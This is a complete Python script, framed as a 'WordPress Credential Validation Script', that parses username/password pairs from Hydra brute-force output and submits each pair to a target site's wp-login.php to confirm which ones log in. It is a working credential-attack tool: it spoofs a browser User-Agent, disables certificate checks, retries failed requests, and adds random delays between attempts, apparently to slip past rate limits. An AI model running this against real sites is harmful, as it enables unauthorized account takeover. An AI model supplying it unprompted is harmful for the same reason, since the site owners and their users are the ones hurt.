import requests
import urllib3
import re
import time
import random
import argparse
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from colorama import Fore, Style, init
from itertools import cycle

# Initialize colorama
init(autoreset=True)

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Argument parser setup
parser = argparse.ArgumentParser(description="WordPress Credential Validation Script")
parser.add_argument("-u", "--url", required=True, help="Target login URL (e.g., https://example.com/wp-login.php)")
parser.add_argument("-f", "--file", required=True, help="Path to the hydra output file with usernames and passwords")
parser.add_argument("-l", "--limit", type=int, default=None, help="Limit the number of tests to run")
args = parser.parse_args()

# Target URL, credential file, and test limit from arguments
login_url = args.url
hydra_output_file = args.file
test_limit = args.limit

# ASCII Art Banner (using a raw string to avoid escape sequence warnings)
ascii_banner = r"""
{Fore.CYAN}
    __     __       _        _                   _     
    \ \   / /__ _ __| |_ __ _| |__   __ _ ___ ___| |__  
     \ \ / / _ \ '__| __/ _` | '_ \ / _` / __/ __| '_ \ 
      \ V /  __/ |  | || (_| | |_) | (_| \__ \__ \ | | |
       \_/ \___|_|   \__\__,_|_.__/ \__,_|___/___/_| |_|                                           
                                                      
{Style.RESET_ALL}
"""

# Introduction Message
def display_intro():
    print(ascii_banner.format(Fore=Fore, Style=Style))
    print(f"{Fore.CYAN}Welcome to the WordPress Credential Validation Script!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Target Site: {Fore.WHITE}{login_url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Purpose:{Style.RESET_ALL} This script tests username and password combinations extracted from the specified file to validate access on the target WordPress site.")
    print(f"{Fore.GREEN}Let's begin testing...{Style.RESET_ALL}\n")
    time.sleep(2)

# Display the introduction
display_intro()

# Initialize a list to hold extracted credentials
credentials = []

# Regular expression pattern to extract successful credentials from Hydra output
pattern = r"login:\s(\S+)\s+password:\s(\S+)"

# Read the specified hydra output file and extract credentials
with open(hydra_output_file, "r") as file:
    for line in file:
        match = re.search(pattern, line)
        if match:
            username = match.group(1)
            password = match.group(2)
            credentials.append({"username": username, "password": password})

# Apply the test limit if specified
if test_limit:
    credentials = credentials[:test_limit]

# Spinner for status processing indicator
spinner = cycle(["|", "/", "-", "\\"])

# Initialize counters and a list to store connection errors
total_tests = 0
success_count = 0
failure_count = 0
connection_error_count = 0
connection_errors = []

# Function to validate credentials with retry mechanism and persistent session
def validate_credentials(username, password, session):
    global total_tests, success_count, failure_count, connection_error_count
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': login_url,
        'testcookie': '1'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
    }

    try:
        # Send POST request to login with adjusted timeout, headers, and SSL verification disabled
        response = session.post(login_url, data=payload, headers=headers, timeout=10, verify=False)
        
        # Update total tests count
        total_tests += 1
        
        # Check if login was successful
        if "dashboard" in response.text.lower():
            success_count += 1
            print(f"\r{Fore.GREEN}Testing {username}:{password} - Success {Style.RESET_ALL}{next(spinner)}", end='', flush=True)
            return True
        else:
            failure_count += 1
            print(f"\r{Fore.RED}Testing {username}:{password} - Failed {Style.RESET_ALL}{next(spinner)}", end='', flush=True)
            return False
    except requests.exceptions.ConnectionError as e:
        # Friendly explanation for ConnectionError, overwriting previous output
        connection_error_count += 1
        connection_errors.append((username, password))  # Store the username and password causing the error
        print(f"\r{Fore.YELLOW}Testing {username}:{password} - Connection aborted. Retrying... {Style.RESET_ALL}{next(spinner)}", end='', flush=True)
        return False

# Set up a retry strategy
retry_strategy = Retry(
    total=3,                     # Total number of retries
    backoff_factor=1,            # Wait 1 second between retries, doubles after each failure
    status_forcelist=[429, 500, 502, 503, 504],  # Retry on these HTTP status codes
)
adapter = HTTPAdapter(max_retries=retry_strategy)

# Use a session with the retry strategy and persistent connection
with requests.Session() as session:
    session.mount("https://", adapter)

    # Loop through extracted credentials and validate each
    for cred in credentials:
        validate_credentials(cred["username"], cred["password"], session)
        time.sleep(random.uniform(5, 10))  # Random delay between 5 and 10 seconds

# Display summary statistics
print("\n" + "="*40)
print(f"{Fore.CYAN}Test Summary{Style.RESET_ALL}")
print("="*40)
print(f"{Fore.YELLOW}Total Tests Attempted: {Fore.WHITE}{total_tests}{Style.RESET_ALL}")
print(f"{Fore.GREEN}Successful Logins: {Fore.WHITE}{success_count}{Style.RESET_ALL}")
print(f"{Fore.RED}Failed Logins: {Fore.WHITE}{failure_count}{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}Connection Errors: {Fore.WHITE}{connection_error_count}{Style.RESET_ALL}")
print("="*40)
print(f"{Fore.GREEN}Testing complete!{Style.RESET_ALL}")

# Display details of connection errors if any
if connection_error_count > 0:
    print(f"\n{Fore.MAGENTA}Details of Connection Errors:{Style.RESET_ALL}")
    print("=" * 40)
    for username, password in connection_errors:
        print(f"{Fore.YELLOW}Username: {Fore.WHITE}{username} {Fore.YELLOW}Password: {Fore.WHITE}{password}{Style.RESET_ALL}")
    print("=" * 40)
